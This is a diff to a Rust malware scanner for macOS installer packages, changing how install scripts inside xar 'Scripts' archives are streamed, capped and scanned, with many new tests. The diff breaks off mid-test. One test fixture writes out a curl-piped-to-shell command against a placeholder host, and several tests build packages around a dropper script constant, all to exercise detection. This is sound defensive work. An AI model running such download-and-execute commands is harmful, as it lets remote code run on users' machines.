@@ -28,8 +28,9 @@ const MAX_SCRIPT_WEIGHT: i32 = 20;
 /// Corroboration only: below Notify on its own (§5.1).
 const DISTRIBUTION_INTERPRETER_WEIGHT: i32 = 8;
 
-/// Weight for a package listing so many components Installer runs that their
-/// `Scripts` cannot all be read under the read-back budget (§5.2, §6.2).
+/// Weight for `Scripts` that Installer runs overrunning the read-back budget:
+/// cut by their share before the cpio trailer, or holding a script longer
+/// than the per-member scan cap (§5.2, §6.2).
 /// Corroboration only: below Notify alone; with `unsigned-installer-package`
 /// it reaches Notify across two categories (§5.1).
 const INSTALLER_SCRIPTS_STARVED_WEIGHT: i32 = 10;
@@ -197,21 +198,23 @@ impl InstallerScriptRule {
                 budget.start_entry(total - rank);
                 let mut found = ScriptFindings::default();
                 let result = if entries[i].nested {
-                    let result = scan_scripts_entry(
+                    let (result, overrun) = scan_scripts_entry(
                         ctx,
                         content,
                         &archive,
                         entries[i].entry,
                         &mut budget,
+                        limits.max_entry_bytes,
                         &mut found,
                     );
-                    // Reported once per package (§5.2, #112).
-                    if runs && total > 1 && !starved && budget.last_cut_by_share() {
+                    // Reported once per package (§5.2, #112, #123).
+                    if runs && overrun && !starved {
                         starved = true;
+                        let s = if scripts == 1 { "" } else { "s" };
                         found.add(
                             INSTALLER_SCRIPTS_STARVED_WEIGHT,
                             format!(
-                                "scripts Installer runs exceed the read budget ({scripts} components)"
+                                "scripts Installer runs exceed the read budget ({scripts} component{s})"
                             ),
                         );
                     }
@@ -237,8 +240,7 @@ impl InstallerScriptRule {
         found_by_entry.sort_by_key(|(toc_index, _)| *toc_index);
         let mut findings = ScriptFindings::default();
         for (_, found) in found_by_entry {
-            findings.total = findings.total.saturating_add(found.total);
-            findings.descriptions.extend(found.descriptions);
+            findings.absorb(found);
         }
 
         // Nothing scored: clean only if every entry was actually read.
@@ -287,9 +289,9 @@ struct ScriptFindings {
 
 impl ScriptFindings {
     /// Scans `bytes` with the embedded-content rules; each signal is recorded
-    /// as `"{prefix}: {description}"`.
-    fn scan(&mut self, label: String, bytes: Vec<u8>, prefix: &str) {
-        let result = scan_embedded_bytes(label, bytes, false, &embedded_content_ruleset());
+    /// as `"{prefix}: {description}"`. `truncated` if `bytes` is a prefix.
+    fn scan(&mut self, label: String, bytes: Vec<u8>, prefix: &str, truncated: bool) {
+        let result = scan_embedded_bytes(label, bytes, truncated, &embedded_content_ruleset());
         for signal in &result.signals {
             self.total = self.total.saturating_add(signal.weight);
             self.descriptions
@@ -302,120 +304,297 @@ impl ScriptFindings {
         self.total = self.total.saturating_add(weight);
         self.descriptions.push(description);
     }
+
+    /// Appends `other`'s findings after these.
+    fn absorb(&mut self, other: ScriptFindings) {
+        self.total = self.total.saturating_add(other.total);
+        self.descriptions.extend(other.descriptions);
+    }
 }
 
-/// Reads the `Scripts` entry (gzip-wrapped cpio) and scans each regular
-/// member. Errors with `NotApplicable` if any step can't be read in full.
+/// Reads the `Scripts` entry (gzip-wrapped cpio), scanning each regular member
+/// as it is decoded. Returns `NotApplicable` if any step can't be read in
+/// full, and whether the entry overran a limit Installer's scripts never come
+/// near: its share (unless its input alone is over a lone entry's) or a size cap
+/// stopped it before the cpio trailer, the walk
+/// hit the member-count or name limit, or a script is longer than
+/// `max_member_bytes` (§5.2, #123).
 fn scan_scripts_entry(
     ctx: &ScanContext,
     content: &[u8],
     archive: &xar::XarArchive,
     entry: &xar::XarFile,
     budget: &mut xar::ReadBudget,
+    max_member_bytes: usize,
     findings: &mut ScriptFindings,
-) -> Result<(), RuleOutcome> {
-    // An entry we can't reach (bounded read stopped short) is
-    // unreadable, not absent. A partial read is scanned, then reported
-    // unreadable below.
-    let mut bytes = CollectedScripts::default();
-    let read = budget
-        .read_entry_nested(content, archive, entry, &mut bytes)
-        .map_err(|_| RuleOutcome::NotApplicable)?;
+) -> (Result<(), RuleOutcome>, bool) {
+    let total = max_member_bytes.saturating_mul(SCANNED_ENTRY_MULTIPLE);
+    let mut sink = ScriptsSink {
+        label: format!("{}!{}", ctx.path.display(), entry.path),
+        scan_left: total,
+        later_scan_left: total,
+        first: ScriptsPart::new(max_member_bytes, ""),
+        later: vec![ScriptsPart::new(max_member_bytes, LATER_MEMBER_NOTE)],
+    };
+    // An entry we can't reach (bounded read stopped short) is unreadable, not
+    // absent. A partial read is scanned, then reported unreadable below.
+    let read = budget.read_entry_nested(content, archive, entry, &mut sink);
+    // Hiding a script behind input alone takes a stream of over half a lone
+    // entry's input share (64 MiB gzip, ~43 MiB zlib), and real installers
+    // can carry big Scripts (§5.2).
+    let cut = (budget.last_cut_by_share() && !budget.last_input_over_share())
+        || budget.last_cut_at_limit();
+    let Ok(read) = read else {
+        return (Err(RuleOutcome::NotApplicable), cut);
+    };
+    let ScriptsSink {
+        label,
+        mut scan_left,
+        mut later_scan_left,
+        first,
+        later,
+    } = sink;
 
-    let label = format!("{}!{}", ctx.path.display(), entry.path);
     // A nested gzip's input past where it stopped (stored-block text past a
     // limit) is scanned raw.
     if !read.unread.is_empty() {
-        findings.scan(label.clone(), read.unread, "install scripts (unparsed)");
+        let unread = read.unread;
+        findings.scan(
+            label.clone(),
+            unread,
+            "install scripts (unparsed)",
+            read.unread_cut,
+        );
     }
-
-    let result = match cpio::parse(&bytes.first, &cpio::CpioLimits::default()) {
-        // Members that did parse, plus one cut off mid-body, are scanned even
-        // when the archive is incomplete.
-        Some(members) => {
-            scan_cpio_members(ctx, entry, &members, "", findings);
-            if members.is_complete() && read.gap.is_none() {
-                Ok(())
-            } else {
-                Err(RuleOutcome::NotApplicable)
-            }
-        }
-        None => {
-            // Something is in there, but not in a shape we can read: scan it raw.
-            findings.scan(label.clone(), bytes.first, "install scripts (unparsed)");
-            Err(RuleOutcome::NotApplicable)
-        }
-    };
-    scan_later_members(ctx, entry, label, bytes.later, findings);
-    result
-}
-
-/// A `Scripts` entry's decoded bytes, as [`xar::ReadBudget::read_entry_nested`]
-/// sends them.
-#[derive(Default)]
-struct CollectedScripts {
-    first: Vec<u8>,
-    later: Vec<u8>,
-}
-
-impl xar::NestedSink for CollectedScripts {
-    fn first(&mut self, bytes: &[u8]) {
-        self.first.extend_from_slice(bytes);
-    }
-
-    fn later(&mut self, bytes: &[u8]) {
-        self.later.extend_from_slice(bytes);
-    }
-}
-
-/// Scans a [`xar::NestedEntry`]'s later gzip members: as cpio members if it parses,
-/// raw otherwise. Installer never runs these (#109), so nothing here makes the
-/// entry unreadable; a script from the first member can still extract them.
-fn scan_later_members(
-    ctx: &ScanContext,
-    entry: &xar::XarFile,
-    label: String,
-    later: Vec<u8>,
-    findings: &mut ScriptFindings,
-) {
-    if later.is_empty() {
-        return;
-    }
-    match cpio::parse(&later, &cpio::CpioLimits::default()) {
-        Some(members) => scan_cpio_members(ctx, entry, &members, LATER_MEMBER_NOTE, findings),
-        None => findings.scan(
-            label,
-            later,
+    let first = first.finish(
+        &label,
+        "install scripts (unparsed)",
+        read.gap.is_some(),
+        &mut scan_left,
+    );
+    findings.absorb(first.findings);
+    // Installer never runs later members (#109): nothing there makes the
+    // entry unreadable.
+    for part in later {
+        let later = part.finish(
+            &label,
             "install scripts (later gzip member, unparsed)",
-        ),
+            false,
+            &mut later_scan_left,
+        );
+        findings.absorb(later.findings);
     }
+
+    let script_over_cap = first.script_over_cap || (first.script_alias && first.over_cap);
+    let overrun = (cut && !first.trailer) || first.limit_halt || script_over_cap;
+    let complete = first.trailer && !first.over_cap && !first.skipped && read.gap.is_none();
+    let result = if complete {
+        Ok(())
+    } else {
+        Err(RuleOutcome::NotApplicable)
+    };
+    (result, overrun)
 }
+
+/// Names of the scripts Installer runs from the top of a component's `Scripts`.
+const INSTALL_SCRIPT_NAMES: [&str; 6] = [
+    "preinstall",
+    "postinstall",
+    "preflight",
+    "postflight",
+    "preupgrade",
+    "postupgrade",
+];
+
+/// Whether a cpio member name is one of [`INSTALL_SCRIPT_NAMES`] at the top
+/// level: cut at the first NUL, leading `./` removed, case-folded as APFS
+/// folds it.
+fn is_install_script(name: &str) -> bool {
+    let mut name = name.split('\0').next().unwrap_or_default();
+    while let Some(rest) = name.strip_prefix("./") {
+        name = rest;
+    }
+    // U+017F (long s) is the one non-ASCII code point that folds to a letter
+    // of these names.
+    let folded: String = name
+        .chars()
+        .map(|c| match c {
+            '\u{17F}' => 's',
+            c => c.to_ascii_lowercase(),
+        })
+        .collect();
+    INSTALL_SCRIPT_NAMES.contains(&folded.as_str())
+}
+
+/// How many times the per-member cap the content rules scan across one
+/// `Scripts` entry's members other than install scripts (§5.2, #123).
+const SCANNED_ENTRY_MULTIPLE: usize = 4;
 
 /// Description note for a script found in a `Scripts` gzip member after the
 /// first, which Installer does not extract.
 const LATER_MEMBER_NOTE: &str = " (later gzip member, not run by Installer)";
 
-/// Scans each non-empty regular member of `members`, including one cut off
-/// mid-body, labelled `install script {name}{note}`.
-fn scan_cpio_members(
-    ctx: &ScanContext,
-    entry: &xar::XarFile,
-    members: &cpio::CpioArchive,
-    note: &str,
-    findings: &mut ScriptFindings,
-) {
-    let parsed = members.entries.iter().map(|m| (m, ""));
-    let cut = members.cut_short.iter().map(|m| (m, " (cut short)"));
-    for (member, cut_note) in parsed.chain(cut) {
-        if !member.is_regular_file() || member.data.is_empty() {
-            continue;
+/// A [`xar::NestedSink`] that walks a `Scripts` entry's first member and its
+/// later members as cpio, scanning members as they complete.
+struct ScriptsSink {
+    /// `{file}!{entry path}`.
+    label: String,
+    /// Bytes still to scan of the first member's members other than install
+    /// scripts.
+    scan_left: usize,
+    /// The same for later members, all sources together.
+    later_scan_left: usize,
+    first: ScriptsPart,
+    /// One walk per source of later members; the last is current.
+    later: Vec<ScriptsPart>,
+}
+
+impl xar::NestedSink for ScriptsSink {
+    fn first(&mut self, bytes: &[u8]) {
+        self.first.push(&self.label, bytes, &mut self.scan_left);
+    }
+
+    fn later(&mut self, bytes: &[u8]) {
+        if let Some(part) = self.later.last_mut() {
+            part.push(&self.label, bytes, &mut self.later_scan_left);
         }
-        let label = format!("{}!{}/{}", ctx.path.display(), entry.path, member.name);
-        findings.scan(
-            label,
-            member.data.to_vec(),
-            &format!("install script {}{note}{cut_note}", member.name),
-        );
+    }
+
+    fn later_from_entry(&mut self) {
+        let cap = self.first.max_member_bytes;
+        self.later.push(ScriptsPart::new(cap, LATER_MEMBER_NOTE));
+    }
+}
+
+/// One cpio stream of a `Scripts` entry and what scanning it found.
+struct ScriptsPart {
+    walk: cpio::CpioStream,
+    max_member_bytes: usize,
+    scanned: ScriptsScanned,
+}
+
+/// What scanning a [`ScriptsPart`]'s members found.
+#[derive(Default)]
+struct ScriptsScanned {
+    /// Appended to each member's description.
+    note: &'static str,
+    findings: ScriptFindings,
+    /// The walk reached the cpio trailer (set by [`ScriptsPart::finish`]).
+    trailer: bool,
+    /// The walk halted at its member-count or name limit.
+    limit_halt: bool,
+    /// A regular member was longer than the scan cap.
+    over_cap: bool,
+    /// One of those was named as an install script.
+    script_over_cap: bool,
+    /// An install script name is a link or other non-regular member, or
+    /// empty: any over-cap member may be what it runs.
+    script_alias: bool,
+    /// A member's body was not scanned: past the entry's scan total.
+    skipped: bool,
+}
+
+impl ScriptsPart {
+    fn new(max_member_bytes: usize, note: &'static str) -> Self {
+        ScriptsPart {
+            walk: cpio::CpioStream::new(cpio::StreamLimits {
+                max_entries: cpio::CpioLimits::default().max_entries,
+                max_member_bytes,
+            }),
+            max_member_bytes,
+            scanned: ScriptsScanned {
+                note,
+                ..ScriptsScanned::default()
+            },
+        }
+    }
+
+    fn push(&mut self, label: &str, bytes: &[u8], scan_left: &mut usize) {
+        let members = self.walk.push(bytes);
+        self.scanned.scan_members(label, members, scan_left);
+    }
+
+    /// Ends the walk: scans what is left (bytes that are not cpio are scanned
+    /// raw as `unparsed`, a member cut off mid-body as far as it goes).
+    /// `gap` if the bytes walked stop short of the stream's end.
+    fn finish(
+        self,
+        label: &str,
+        unparsed: &str,
+        gap: bool,
+        scan_left: &mut usize,
+    ) -> ScriptsScanned {
+        let mut scanned = self.scanned;
+        let (members, end) = self.walk.finish();
+        scanned.scan_members(label, members, scan_left);
+        match end {
+            cpio::StreamEnd::NotCpio { raw, more } => {
+                if !raw.is_empty() {
+                    let cut = more || gap;
+                    scanned.findings.scan(label.to_string(), raw, unparsed, cut);
+                }
+            }
+            cpio::StreamEnd::Archive { halted, cut_short } => {
+                scanned.scan_members(label, cut_short.into_iter().collect(), scan_left);
+                scanned.trailer = halted.is_none();
+                scanned.limit_halt = matches!(
+                    halted,
+                    Some(cpio::CpioHalt::EntryLimit | cpio::CpioHalt::ByteLimit)
+                );
+            }
+        }
+        scanned
+    }
+}
+
+impl ScriptsScanned {
+    /// Scans each non-empty regular member (file type 0 included) and any
+    /// non-empty install script, labelled `install script {name}{note}`, plus
+    /// ` (cut short)` if only part of its body was read. Members that are not
+    /// install scripts are scanned only while `scan_left` lasts.
+    fn scan_members(
+        &mut self,
+        label: &str,
+        members: Vec<cpio::StreamedMember>,
+        scan_left: &mut usize,
+    ) {
+        for member in members {
+            let script = is_install_script(&member.name);
+            // An unknown type is extracted as a regular file.
+            let regular = member.is_regular_file() || member.mode & 0o170000 == 0;
+            if !regular || member.data.is_empty() {
+                self.script_alias |= script;
+            }
+            if !regular && !script {
+                continue;
+            }
+            if member.end == cpio::MemberEnd::OverCap {
+                self.over_cap = true;
+                self.script_over_cap |= script;
+            }
+            if member.data.is_empty() {
+                continue;
+            }
+            let len = member.data.len();
+            if script {
+                *scan_left = scan_left.saturating_sub(len);
+            } else if len > *scan_left {
+                self.skipped = true;
+                continue;
+            } else {
+                *scan_left -= len;
+            }
+            let cut_note = match member.end {
+                cpio::MemberEnd::Whole => "",
+                cpio::MemberEnd::OverCap | cpio::MemberEnd::CutShort => " (cut short)",
+            };
+            self.findings.scan(
+                format!("{label}/{}", member.name),
+                member.data,
+                &format!("install script {}{}{cut_note}", member.name, self.note),
+                member.end != cpio::MemberEnd::Whole,
+            );
+        }
     }
 }
 
@@ -1086,7 +1265,7 @@ fn scan_distribution_text(label: String, js: Vec<u8>, findings: &mut ScriptFindi
             format!("distribution script: system.run launches an interpreter ({name})"),
         );
     }
-    findings.scan(label, js, "distribution script");
+    findings.scan(label, js, "distribution script", false);
 }
 
 /// Shells and script interpreters that `system.run` should not be launching
@@ -1210,7 +1389,6 @@ impl Rule for UnsignedPackageRule {
 mod tests {
     use super::*;
     use crate::context::{ContentSource, ScanContext};
-    use crate::decode::DecodeError;
     use crate::test_support::utf16;
     use std::path::PathBuf;
 
@@ -2017,11 +2195,16 @@ mod tests {
 
     /// One odc cpio member (regular file, mode 0644).
     fn odc_member(name: &str, body: &[u8]) -> Vec<u8> {
+        odc_member_mode(name, body, 0o100644)
+    }
+
+    /// One odc cpio member with the given mode.
+    fn odc_member_mode(name: &str, body: &[u8], mode: u32) -> Vec<u8> {
         let mut v = format!(
             "070707{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:011o}{:06o}{:011o}",
             0,
             0,
-            0o100644,
+            mode,
             0,
             0,
             1,
@@ -2037,7 +2220,8 @@ mod tests {
         v
     }
 
-    /// A walk halted by the entry limit scans only the members it parsed.
+    /// A walk halted by the entry limit scans only the members it parsed, and
+    /// is reported: real `Scripts` have a handful of members (#123).
     #[test]
     fn members_past_the_entry_limit_are_not_scanned() {
         let mut cpio = Vec::new();
@@ -2050,10 +2234,12 @@ mod tests {
         ));
 
         let c = ctx("s.pkg", &pkg_with_scripts(&cpio));
-        assert!(matches!(
-            InstallerScriptRule.evaluate(&c),
-            Err(RuleOutcome::NotApplicable)
-        ));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the limit is reported");
+        assert_eq!(signal.description, format!("{STARVED} (1 component)"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
     }
 
     /// A gzip header, one decoded byte, then an invalid DEFLATE symbol,
@@ -2841,7 +3027,7 @@ mod tests {
         cpio
     }
 
-    /// A budget-cut outer read is incomplete, never clean.
+    /// A `Scripts` read cut at any per-member cap is incomplete, never clean.
     #[test]
     fn a_budget_cut_scripts_read_is_incomplete() {
         let gz = gzip_stored(&scoring_cpio());
@@ -2957,8 +3143,8 @@ mod tests {
         (found, c.marked_incomplete("installer-script-suspicious"))
     }
 
-    /// An inner gzip cut short by the outer entry cap leaves no unread input:
-    /// the cut member is scanned, the compressed bytes are not again (#81).
+    /// A member cut at the per-member cap leaves no unread input: the cut
+    /// member is scanned, the compressed bytes are not again (#81).
     #[test]
     fn a_limit_cut_inner_gzip_is_not_scanned_raw() {
         let limits = xar::XarLimits {
@@ -3006,23 +3192,24 @@ mod tests {
         gz
     }
 
-    /// The work cap stops the inner gzip before its stored block: that unread
-    /// text is still scanned raw.
+    /// The allowance stops the inner gzip's block work before its stored
+    /// block: that unread text is still scanned raw.
     #[test]
     fn script_text_past_the_inner_work_cap_is_scanned_raw() {
         let gz = gzip_padded_with_empty_blocks(400_000, &scoring_cpio());
-        assert_eq!(
-            crate::inflate::gzip_decompress_partial(&gz, 4 << 20).1,
-            Err(DecodeError::BudgetExceeded)
-        );
-        let (found, gap) = scripts_description(&gz, &xar::XarLimits::default());
+        let limits = xar::XarLimits {
+            max_read_back_bytes: 16 << 20,
+            ..xar::XarLimits::default()
+        };
+        assert!(400_000 * crate::inflate::BLOCK_WORK > limits.max_read_back_bytes);
+        let (found, gap) = scripts_description(&gz, &limits);
         assert!(found.contains("install scripts (unparsed)"), "{found}");
         assert!(gap);
     }
 
     /// A zlib `Scripts` entry that decodes to `1f 8b` plus a non-gzip header
-    /// and a plaintext script, cut by the entry cap: the script text inside the
-    /// prefix is still scanned.
+    /// and a plaintext script, kept only up to the cap: the script text inside
+    /// that prefix is still scanned.
     #[test]
     fn a_cut_scripts_entry_with_a_broken_inner_layer_is_scanned_as_text() {
         let mut inner = vec![0x1f, 0x8b, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
@@ -3146,7 +3333,8 @@ mod tests {
             let before = budget.remaining();
             let mut found = ScriptFindings::default();
             // The empty archive is not complete either way; only the charge matters.
-            let _ = scan_scripts_entry(&c, &bytes, &archive, entry, &mut budget, &mut found);
+            let max = limits.max_entry_bytes;
+            let _ = scan_scripts_entry(&c, &bytes, &archive, entry, &mut budget, max, &mut found);
             charged.push(before - budget.remaining());
         }
         // `k` full reads, then only cut ones from what is left.
@@ -3829,6 +4017,340 @@ mod tests {
         zlib_stored(&gzip_member(&cpio))
     }
 
+    /// A `Scripts` blob (a stored gzip) of a cpio of `members`.
+    fn scripts_of(members: &[(&str, &[u8])]) -> Vec<u8> {
+        let moded: Vec<_> = members.iter().map(|(n, b)| (*n, *b, 0o100644)).collect();
+        scripts_of_modes(&moded)
+    }
+
+    /// [`scripts_of`] with each member's mode.
+    fn scripts_of_modes(members: &[(&str, &[u8], u32)]) -> Vec<u8> {
+        let mut cpio = Vec::new();
+        for (name, body, mode) in members {
+            cpio.extend(odc_member_mode(name, body, *mode));
+        }
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        gzip_member(&cpio)
+    }
+
+    /// A flat package whose one `Scripts` holds `members`, under a 4 KiB
+    /// per-member cap: its signal and whether it was marked incomplete.
+    fn flat_scripts(members: &[(&str, &[u8])]) -> (Option<MatchedSignal>, bool) {
+        flat_scripts_blob(&scripts_of(members))
+    }
+
+    /// [`flat_scripts`] over a `Scripts` blob. `NotApplicable` is no signal
+    /// and incomplete.
+    fn flat_scripts_blob(blob: &[u8]) -> (Option<MatchedSignal>, bool) {
+        let limits = xar::XarLimits {
+            max_entry_bytes: 4096,
+            ..xar::XarLimits::default()
+        };
+        let mut heap = Heap::default();
+        let toc = file("Scripts", heap.add(blob));
+        let (r, c) = evaluate_small(&archive(&toc, &heap), &limits);
+        match r {
+            Ok(signal) => (signal, c.marked_incomplete("installer-script-suspicious")),
+            Err(_) => (None, true),
+        }
+    }
+
+    /// A script behind a member longer than the cap is still read (#123): the
+    /// long member is scanned up to the cap, which leaves the scan `Partial`.
+    #[test]
+    fn a_script_behind_a_member_over_the_cap_is_found() {
+        let pad = vec![b'x'; 6000];
+        let (signal, incomplete) = flat_scripts(&[
+            ("installer_telemetry", &pad),
+            ("preinstall", SCRIPT_DROPPER),
+        ]);
+        let d = signal.expect("finding").description;
+        assert!(d.contains("install script preinstall:"), "{d}");
+        assert!(!d.contains(STARVED), "{d}");
+        assert!(incomplete);
+    }
+
+    /// Members each within the cap may total more than it: all are read in
+    /// full and the scan is complete.
+    #[test]
+    fn members_within_the_cap_are_read_whatever_their_total() {
+        let pad = vec![b'x'; 3000];
+        let (signal, incomplete) = flat_scripts(&[
+            ("a.bin", &pad),
+            ("b.bin", &pad),
+            ("preinstall", SCRIPT_DROPPER),
+        ]);
+        let d = signal.expect("finding").description;
+        assert!(d.contains("install script preinstall:"), "{d}");
+        assert!(!incomplete);
+
+        let (signal, incomplete) = flat_scripts(&[
+            ("a.bin", &pad),
+            ("b.bin", &pad),
+            ("postinstall", b"#!/bin/sh\nexit 0\n"),
+        ]);
+        assert!(signal.is_none(), "{signal:?}");
+        assert!(!incomplete);
+    }
+
+    /// A script longer than the cap is scanned up to it and reported.
+    #[test]
+    fn a_script_over_the_cap_is_scanned_up_to_it_and_reported() {
+        let mut script = SCRIPT_DROPPER.to_vec();
+        script.resize(6000, b'\n');
+        let (signal, incomplete) = flat_scripts(&[("./postinstall", &script)]);
+        let d = signal.expect("finding").description;
+        assert!(
+            d.contains("install script ./postinstall (cut short):"),
+            "{d}"
+        );
+        assert!(d.contains(&format!("{STARVED} (1 component)")), "{d}");
+        assert!(incomplete);
+    }
+
+    /// A top-level script name in another case (APFS's, long s included),
+    /// after `./`, or cut at a NUL is still a script when it runs over the
+    /// cap; one in a directory is not.
+    #[test]
+    fn an_overlong_script_is_recognised_by_its_normalised_name() {
+        let mut body = b"#".repeat(6000);
+        body.extend_from_slice(SCRIPT_DROPPER);
+        for name in [
+            "PreInstall",
+            "././POSTFLIGHT",
+            "postinstall\0.orig",
+            "preinſtall",
+            "./POSTINſTALL",
+        ] {
+            let (signal, incomplete) = flat_scripts(&[(name, &body)]);
+            let d = signal.unwrap_or_else(|| panic!("{name}")).description;
+            assert!(
+                d.contains(&format!("{STARVED} (1 component)")),
+                "{name}: {d}"
+            );
+            assert!(incomplete, "{name}");
+        }
+        // Not a script name: unreadable, not reported.
+        for name in ["preinstall.txt", "./scripts/preinstall", "d/POSTFLIGHT"] {
+            let (signal, incomplete) = flat_scripts(&[(name, &body)]);
+            assert!(signal.is_none(), "{name}: {signal:?}");
+            assert!(incomplete, "{name}");
+        }
+    }
+
+    /// A member of file type 0 is extracted as a regular file and scanned; a
+    /// script-named member of another type is scanned too.
+    #[test]
+    fn type_zero_and_special_script_members_are_scanned() {
+        for mode in [0o000755, 0o010644, 0o140755] {
+            let blob = scripts_of_modes(&[("./preinstall", SCRIPT_DROPPER, mode)]);
+            let (signal, incomplete) = flat_scripts_blob(&blob);
+            let d = signal.unwrap_or_else(|| panic!("{mode:o}")).description;
+            assert!(d.contains("install script ./preinstall:"), "{mode:o}: {d}");
+            assert!(!incomplete, "{mode:o}");
+        }
+        let blob = scripts_of_modes(&[("./helper.sh", SCRIPT_DROPPER, 0o000644)]);
+        let (signal, _) = flat_scripts_blob(&blob);
+        assert!(signal.is_some());
+    }
+
+    /// Later gzip members from the held gzip and from the entry's own stream
+    /// are walked as separate cpio archives, each scanned.
+    #[test]
+    fn each_source_of_later_members_is_walked() {
+        let benign = [
+            odc_member("./a", b"echo hi\n"),
+            odc_member("TRAILER!!!", b""),
+        ]
+        .concat();
+        let dropper = [
+            odc_member("./preinstall", SCRIPT_DROPPER),
+            odc_member("TRAILER!!!", b""),
+        ]
+        .concat();
+        let held = [gzip_member(&benign), gzip_member(&benign)].concat();
+        let blob = [gzip_member(&held), gzip_member(&dropper)].concat();
+        let (signal, _) = flat_scripts_blob(&blob);
+        let d = signal.expect("finding").description;
+        assert!(d.contains(LATER_MEMBER_NOTE), "{d}");
+    }
+
+    /// Later members have their own scan total: filler there does not starve
+    /// a cut-short member of the first.
+    #[test]
+    fn later_filler_does_not_starve_the_first_member() {
+        let mut first = odc_member("./helper.sh", SCRIPT_DROPPER);
+        // Declare a longer body than is there, so the member is cut short.
+        let declared = format!("{:011o}", SCRIPT_DROPPER.len() + 100);
+        first[65..76].copy_from_slice(declared.as_bytes());
+        let pad = vec![b'x'; 4096];
+        let mut filler = Vec::new();
+        for name in ["a", "b", "c", "d", "e"] {
+            filler.extend(odc_member(name, &pad));
+        }
+        filler.extend(odc_member("TRAILER!!!", b""));
+        let blob = [gzip_member(&first), gzip_member(&filler)].concat();
+        let (signal, incomplete) = flat_scripts_blob(&blob);
+        let d = signal.expect("finding").description;
+        assert!(d.contains("install script ./helper.sh (cut short):"), "{d}");
+        assert!(incomplete);
+    }
+
+    /// A script name that is a link, another non-regular member, or empty (an
+    /// odc hard link) may run any over-cap member, so that is reported.
+    #[test]
+    fn a_script_linked_to_an_overlong_member_is_reported() {
+        let mut body = b"#".repeat(6000);
+        body.extend_from_slice(SCRIPT_DROPPER);
+        let big = ("payload.sh", &body[..], 0o100755);
+        for script in [
+            ("preinstall", &b"payload.sh"[..], 0o120755),
+            ("preinstall", &b""[..], 0o100755),
+            ("PostInstall", &b""[..], 0o060644),
+        ] {
+            let (signal, incomplete) = flat_scripts_blob(&scripts_of_modes(&[big, script]));
+            let d = signal.expect("finding").description;
+            assert!(d.contains(STARVED), "{script:?}: {d}");
+            assert!(incomplete, "{script:?}");
+        }
+    }
+
+    /// Past the entry's scan total, members other than scripts are walked but
+    /// not scanned, leaving the scan `Partial`; scripts are still scanned.
+    #[test]
+    fn members_past_the_scan_total_are_skipped_but_scripts_are_not() {
+        // Four members at the cap use the whole 16 KiB total; the fifth is skipped.
+        let pad = vec![b'x'; 4096];
+        let mut members: Vec<(&str, &[u8])> = Vec::new();
+        let names = ["a.bin", "b.bin", "c.bin", "d.bin", "e.bin"];
+        for name in names {
+            members.push((name, &pad));
+        }
+        members.push(("preinstall", SCRIPT_DROPPER));
+        let (signal, incomplete) = flat_scripts(&members);
+        let d = signal.expect("finding").description;
+        assert!(d.contains("install script preinstall:"), "{d}");
+        assert!(!d.contains(STARVED), "{d}");
+        assert!(incomplete);
+
+        // Only a top-level script is exempt from the total.
+        for name in ["helper.sh", "d/preinstall"] {
+            members.pop();
+            members.push((name, SCRIPT_DROPPER));
+            let (signal, incomplete) = flat_scripts(&members);
+            assert!(signal.is_none(), "{name}: {signal:?}");
+            assert!(incomplete);
+        }
+    }
+
+    /// A body cut at the cap is scanned as a prefix: a pattern that would end
+    /// exactly at the cut (`| sh` of `| shasum`) does not match.
+    #[test]
+    fn a_body_cut_at_the_cap_is_scanned_as_a_prefix() {
+        let tail = b"\ncurl -fsSL https://example.invalid/a | sh";
+        let mut body = b"#".repeat(4096 - tail.len());
+        body.extend_from_slice(tail);
+        body.extend_from_slice(b"asum\n");
+        let (signal, incomplete) = flat_scripts(&[("checksum.txt", &body)]);
+        let d = signal.map(|s| s.description).unwrap_or_default();
+        assert!(!d.contains("piped to a shell"), "{d}");
+        assert!(incomplete);
+    }
+
+    /// A gzip held for the nested decode past four times the entry cap is
+    /// cut there and reported.
+    #[test]
+    fn a_held_gzip_past_its_cap_is_reported() {
+        let cpio = [
+            odc_member("payload.bin", &[0; 20_000]),
+            odc_member("preinstall", SCRIPT_DROPPER),
+            odc_member("TRAILER!!!", b""),
+        ]
+        .concat();
+        let (signal, incomplete) = flat_scripts_blob(&zlib_stored(&gzip_member(&cpio)));
+        let d = signal.expect("finding").description;
+        assert_eq!(d, format!("{STARVED} (1 component)"));
+        assert!(incomplete);
+    }
+
+    /// A stored `Scripts` is the gzip itself, decoded by the outer read: the
+    /// held cap does not apply, however large it is.
+    #[test]
+    fn a_stored_scripts_past_the_held_cap_is_not_reported() {
+        let blob = scripts_of(&[
+            ("./Installer.dmg", &[0; 20_000]),
+            ("./postinstall", b"#!/bin/sh\nexit 0\n"),
+        ]);
+        assert!(blob.len() > 4 * 4096);
+        let (signal, incomplete) = flat_scripts_blob(&blob);
+        assert!(signal.is_none(), "{signal:?}");
+        assert!(incomplete);
+    }
+
+    /// A share stop counts as an overrun only when decoding, not the raw input
+    /// alone, ran past the share: a large input is unreadable, not reported.
+    #[test]
+    fn a_share_stop_on_raw_input_alone_is_not_reported() {
+        let run = |blob: &[u8]| {
+            let limits = xar::XarLimits {
+                max_entry_bytes: 4096,
+                max_read_back_bytes: 40_000,
+                ..xar::XarLimits::default()
+            };
+            let mut heap = Heap::default();
+            let toc = file("Scripts", heap.add(blob));
+            let (r, c) = evaluate_small(&archive(&toc, &heap), &limits);
+            // `NotApplicable` is no finding and incomplete.
+            let incomplete = r.is_err() || c.marked_incomplete("installer-script-suspicious");
+            let d = r.ok().flatten().map(|s| s.description).unwrap_or_default();
+            (d, incomplete)
+        };
+        // A stored 30 KB gzip: input over a lone entry's 20 KB share.
+        let noise: Vec<u8> = (0..30_000u32).map(|i| (i * 7919 % 251) as u8).collect();
+        let big = scripts_of(&[("./data.bin", &noise), ("./postinstall", b"exit 0\n")]);
+        assert!(big.len() > 20_000);
+        let (d, incomplete) = run(&big);
+        assert!(!d.contains(STARVED), "{d}");
+        assert!(incomplete);
+        // A small gzip whose empty blocks' decode work runs past the share.
+        let cpio = [
+            odc_member("./preinstall", SCRIPT_DROPPER),
+            odc_member("TRAILER!!!", b""),
+        ]
+        .concat();
+        let n = u16::try_from(cpio.len()).expect("one block");
+        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
+        // Four empty fixed-Huffman blocks per five bytes.
